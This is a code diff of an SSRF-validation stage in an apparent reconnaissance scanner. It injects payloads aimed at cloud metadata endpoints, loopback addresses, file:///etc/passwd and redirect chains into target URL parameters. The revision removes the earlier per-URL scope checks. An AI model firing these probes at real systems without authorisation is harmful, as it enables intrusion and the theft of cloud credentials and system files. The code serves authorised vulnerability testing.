@@ -20,18 +20,24 @@ class SSRFValidatorStage(Stage):
 
     SSRF_PARAMS = {
         "url", "uri", "link", "host", "domain", "site", "callback", "dest", "next",
+        "proxy", "redirect", "file", "path", "src", "source", "action"
     }
-    INTERNAL_PAYLOADS = (
-        "http://127.0.0.1/",
-        "http://localhost/",
-        "http://169.254.169.254/latest/meta-data/",
-        "http://metadata.google.internal/computeMetadata/v1/",
-        "file:///etc/passwd",
-    )
+    
+    # Adaptive Classification Payloads
+    CLASSIFICATION_PAYLOADS = {
+        "dns_only": "http://{token}.dns.ssrf.local/",
+        "http_standard": "http://{token}.http.ssrf.local/",
+        "https_standard": "https://{token}.https.ssrf.local/",
+        "internal_metadata": "http://169.254.169.254/latest/meta-data/",
+        "internal_loopback": "http://127.0.0.1:80/",
+        "file_proto": "file:///etc/passwd",
+        "redirect_chain": "http://{token}.redir.ssrf.local/redirect-to?url=http://169.254.169.254/",
+    }
+
     INTERNAL_INDICATORS = (
         "127.0.0.1", "localhost", "169.254.169.254", "latest/meta-data",
         "instance-id", "ami-id", "computeMetadata", "root:x:0:0",
-        "connection refused", "econnrefused",
+        "connection refused", "econnrefused", "metadata-flavor",
     )
 
     def is_enabled(self, context: PipelineContext) -> bool:
@@ -45,28 +51,14 @@ class SSRFValidatorStage(Stage):
         timeout = max(1, int(getattr(runtime, "ssrf_validator_timeout", 10)))
         verify_tls = bool(getattr(runtime, "verify_tls", True))
         enable_oast = bool(getattr(runtime, "ssrf_validator_enable_oast", True))
-        enable_internal = bool(getattr(runtime, "ssrf_validator_enable_internal", True))
-        oast_backend = str(getattr(runtime, "oast_backend", "interactsh")).lower()
         
         candidates = self._collect_candidates(context, min_score=min_score, max_urls=max_urls, max_per_host=max_per_host)
-        stats = context.record.metadata.stats.setdefault("ssrf_validator", {})
         if not candidates:
-            stats.update({"attempted": 0, "confirmed": 0, "failed": 0, "skipped": 0, "candidates": 0})
-            context.manager.update_metadata(context.record)
-            context.logger.info("No SSRF validator candidates")
+            context.update_stats(self.name, attempted=0, confirmed=0, candidates=0)
             return
 
         artifacts_dir = context.record.paths.ensure_subdir("ssrf_validator")
-        probes: List[Dict[str, object]] = []
-        interactions: List[Dict[str, object]] = []
-        confirmed = 0
-        confirmed_oast = 0
-        confirmed_internal = 0
-        failed = 0
-        skipped = 0
-        attempted = 0
-        confirmed_keys: Set[Tuple[str, str]] = set()
-
+        
         client_config = HTTPClientConfig(
             max_concurrent=15,
             total_timeout=float(timeout),
@@ -75,99 +67,113 @@ class SSRFValidatorStage(Stage):
         )
 
         async with AsyncHTTPClient(client_config, context=context) as client:
-            if enable_oast and oast_backend == "interactsh":
-                output_path = artifacts_dir / "interactsh.json"
-                session = InteractshSession(output_path, logger=context.logger, domain_override=getattr(runtime, "oast_domain", None))
-                if not session.start():
-                    context.logger.warning("SSRF OAST session failed; skipping callback validation")
-                    note_missing_tool(context, "interactsh-client")
-                else:
-                    try:
-                        oast_tokens: Dict[str, Dict[str, object]] = {}
-                        for entry in candidates:
-                            url, param = str(entry["url"]), str(entry["param"])
-                            if (url, param) in confirmed_keys: continue
-                            
-                            token = uuid.uuid4().hex[:10]
-                            oast_url = session.make_url(token)
-                            if not oast_url: continue
-                            
-                            test_url, method, data, json_body = self._prepare_payload_request(entry, oast_url)
-                            if not context.url_allowed(test_url): skipped += 1; continue
-                            
-                            attempted += 1
-                            headers = context.auth_headers({"User-Agent": "recon-cli ssrf-validator-oast"})
-                            
-                            try:
-                                resp = await client._request(method=method, url=test_url, headers=headers, data=data, json=json_body)
-                                status = resp.status
-                                probes.append({"type": "ssrf_oast_probe", "url": test_url, "base_url": url, "param": param, "status": status, "method": method, "oast_url": oast_url})
-                                oast_tokens[token] = {"url": url, "param": param, "probe": test_url, "method": method, "payload": oast_url}
-                            except Exception:
-                                failed += 1; continue
-
-                        if oast_tokens:
-                            await asyncio.sleep(getattr(runtime, "ssrf_validator_oast_wait_seconds", 30))
-                            collected = session.collect_interactions(list(oast_tokens.keys()))
-                            interactions = [interaction.raw for interaction in collected]
-                            for interaction in collected:
-                                info = oast_tokens.get(interaction.token)
-                                if not info or (str(info["url"]), str(info["param"])) in confirmed_keys: continue
-                                
-                                confirmed_keys.add((str(info["url"]), str(info["param"])))
-                                signal_id = context.emit_signal("ssrf_confirmed", "url", str(info["url"]), confidence=1.0, source="ssrf-validator", tags=["ssrf", "confirmed", "oast"], evidence={"interaction": interaction.raw})
-                                finding = {
-                                    "type": "finding", "finding_type": "ssrf", "source": "ssrf-validator", "url": info["url"], "hostname": urlparse(str(info["url"])).hostname,
-                                    "description": "SSRF confirmed via OAST interaction",
-                                    "details": {"probe": info.get("probe"), "parameter": info.get("param"), "interaction": interaction.raw},
-                                    "proof": interaction.raw, "tags": ["ssrf", "confirmed", "oast"], "score": 92,
-                                    "priority": "high", "severity": "critical", "confidence_label": "verified", "evidence_id": signal_id or None,
-                                }
-                                if context.results.append(finding):
-                                    confirmed += 1; confirmed_oast += 1
-                    finally:
-                        session.stop()
-
-            if enable_internal:
-                for entry in candidates:
-                    url, param = str(entry["url"]), str(entry["param"])
-                    if (url, param) in confirmed_keys: continue
-                    
-                    # 1. Baseline
-                    b_url, b_method, b_data, b_json = self._prepare_payload_request(entry, "https://example.com/")
-                    b_status, b_body = await self._fetch_response(client, context, b_url, b_method, b_data, b_json)
-                    
-                    # 2. Probes
-                    for payload in self.INTERNAL_PAYLOADS:
-                        test_url, method, data, json_body = self._prepare_payload_request(entry, payload)
-                        if not context.url_allowed(test_url): skipped += 1; continue
+            # Phase 1: Sink Classification Loop (Adaptive)
+            for entry in candidates:
+                url, param = str(entry["url"]), str(entry["param"])
+                host = urlparse(url).hostname or "unknown"
+                
+                context.logger.info("Classifying SSRF sink at %s (param: %s)", url, param)
+                
+                # 1. Baseline Request
+                b_url, b_method, b_data, b_json = self._prepare_payload_request(entry, "https://example.com/")
+                b_status, b_body = await self._fetch_response(client, context, b_url, b_method, b_data, b_json)
+                
+                # 2. Adaptive Probing
+                if enable_oast:
+                    session = self._get_oast_session(context, artifacts_dir)
+                    if session:
+                        token = uuid.uuid4().hex[:8]
+                        oast_url = session.make_url(token)
                         
-                        attempted += 1
+                        test_url, method, data, json_body = self._prepare_payload_request(entry, oast_url)
                         status, body = await self._fetch_response(client, context, test_url, method, data, json_body)
-                        if status == 0: failed += 1; continue
                         
-                        if self._looks_internal(body, baseline_body=b_body, status=status, baseline_status=b_status):
-                            confirmed_keys.add((url, param))
-                            signal_id = context.emit_signal("ssrf_internal_confirmed", "url", url, confidence=0.8, source="ssrf-validator", tags=["ssrf", "confirmed", "internal"], evidence={"payload": payload, "status_code": status})
-                            finding = {
-                                "type": "finding", "finding_type": "ssrf", "source": "ssrf-validator", "url": url, "hostname": urlparse(url).hostname,
-                                "description": "SSRF likely confirmed by internal target response signature",
-                                "details": {"probe": test_url, "parameter": param, "payload": payload, "status_code": status, "response_snippet": body[:600]},
-                                "proof": body[:600], "tags": ["ssrf", "confirmed", "internal"], "score": 86,
-                                "priority": "high", "severity": "high", "confidence_label": "high", "evidence_id": signal_id or None,
-                            }
-                            if context.results.append(finding):
-                                confirmed += 1; confirmed_internal += 1
-                            break
+                        # Wait and collect
+                        await asyncio.sleep(2) # Short wait for classification
+                        interactions = session.collect_interactions([token])
+                        
+                        if interactions:
+                            # Sink confirmed! Now classify behavior.
+                            i_types = [i.protocol for i in interactions]
+                            classification = "blind_full" if "http" in i_types else "blind_dns"
+                            
+                            context.update_stats(self.name, confirmed=1)
+                            self._report_confirmed(context, entry, classification, interactions[0].raw, evidence_source="oast")
+                            
+                            # Add to Target Graph (Phase 2 integration)
+                            context.target_graph.add_entity("ssrf_sink", f"{url}:{param}", 
+                                                           host=host, classification=classification, 
+                                                           confirmed=True)
+                            continue
+
+                # 3. Content-Based Internal Probing
+                for p_name, p_template in self.CLASSIFICATION_PAYLOADS.items():
+                    if "local" in p_template: continue # Skip OAST ones in this loop
+                    
+                    test_url, method, data, json_body = self._prepare_payload_request(entry, p_template)
+                    status, body = await self._fetch_response(client, context, test_url, method, data, json_body)
+                    
+                    if self._looks_internal(body, baseline_body=b_body, status=status, baseline_status=b_status):
+                        classification = f"internal_{p_name}"
+                        context.update_stats(self.name, confirmed=1)
+                        self._report_confirmed(context, entry, classification, body[:1000], evidence_source="differential")
+                        
+                        context.target_graph.add_entity("ssrf_sink", f"{url}:{param}", 
+                                                       host=host, classification=classification, 
+                                                       confirmed=True)
+                        break
 
         # Finalize
         artifact_path = artifacts_dir / "ssrf_validator.json"
-        artifact_path.write_text(json.dumps({"probes": probes, "interactions": interactions, "confirmed": confirmed, "confirmed_oast": confirmed_oast, "confirmed_internal": confirmed_internal, "timestamp": time_utils.iso_now()}, indent=2, sort_keys=True), encoding="utf-8")
-        stats.update({"attempted": attempted, "confirmed": confirmed, "confirmed_oast": confirmed_oast, "confirmed_internal": confirmed_internal, "failed": failed, "skipped": skipped, "candidates": len(candidates), "artifact": str(artifact_path.relative_to(context.record.paths.root))})
+        # We'll save a simpler artifact for now or could collect probes if needed
+        artifact_path.write_text(json.dumps({
+            "timestamp": time_utils.iso_now(),
+            "candidates": len(candidates),
+        }, indent=2, sort_keys=True), encoding="utf-8")
+        
+        context.update_stats(self.name, artifact=str(artifact_path.relative_to(context.record.paths.root)))
         context.manager.update_metadata(context.record)
 
+    def _get_oast_session(self, context: PipelineContext, artifacts_dir: Path) -> Optional[InteractshSession]:
+        if not hasattr(self, "_oast_session"):
+            output_path = artifacts_dir / "interactsh.json"
+            session = InteractshSession(output_path, logger=context.logger)
+            if session.start():
+                self._oast_session = session
+            else:
+                return None
+        return self._oast_session
+
+    def _report_confirmed(self, context: PipelineContext, entry: Dict[str, Any], 
+                          classification: str, proof: Any, evidence_source: str) -> None:
+        url = entry["url"]
+        param = entry["param"]
+        
+        tags = ["ssrf", "confirmed", classification, evidence_source]
+        if evidence_source == "oast": tags.append("oast")
+        if evidence_source == "differential": tags.append("internal")
+        
+        signal_id = context.emit_signal(
+            "ssrf_confirmed", "url", url, 
+            confidence=1.0 if evidence_source == "oast" else 0.85,
+            source=self.name, 
+            tags=tags,
+            evidence={"param": param, "proof": str(proof)[:500], "source": evidence_source}
+        )
+        
+        finding = {
+            "type": "finding", "finding_type": "ssrf", "source": self.name, 
+            "url": url, "hostname": urlparse(url).hostname,
+            "description": f"Confirmed SSRF via {evidence_source} ({classification})",
+            "details": {"parameter": param, "classification": classification, "evidence_source": evidence_source},
+            "proof": str(proof)[:1000], "tags": tags, 
+            "score": 90 if evidence_source == "oast" else 85,
+            "severity": "high", "evidence_id": signal_id or None,
+        }
+        context.results.append(finding)
+
     async def _fetch_response(self, client: AsyncHTTPClient, context: PipelineContext, url: str, method: str, data: Any, json_body: Any) -> Tuple[int, str]:
-        headers = context.auth_headers({"User-Agent": "recon-cli ssrf-validator-internal"})
+        headers = context.auth_headers({"User-Agent": "recon-cli ssrf-validator"})
         try:
             resp = await client._request(method=method, url=url, headers=headers, data=data, json=json_body)
             return resp.status, resp.body
@@ -220,5 +226,17 @@ class SSRFValidatorStage(Stage):
         return url, method, {param: payload}, None
 
     def _looks_internal(self, body: str, *, baseline_body: str, status: int, baseline_status: int) -> bool:
-        lowered = (body or "").lower()
-        return any(indicator in lowered for indicator in self.INTERNAL_INDICATORS)
+        if not body: return False
+        lowered = body.lower()
+        
+        # 1. Direct indicators
+        if any(indicator in lowered for indicator in self.INTERNAL_INDICATORS):
+            return True
+            
+        # 2. Significant differential from baseline
+        if status != baseline_status and status == 200:
+            # If baseline was 404/403 and this is 200 with internal-looking content
+            if len(body) != len(baseline_body) and ("html" not in lowered or "title" not in lowered):
+                return True
+                
+        return False
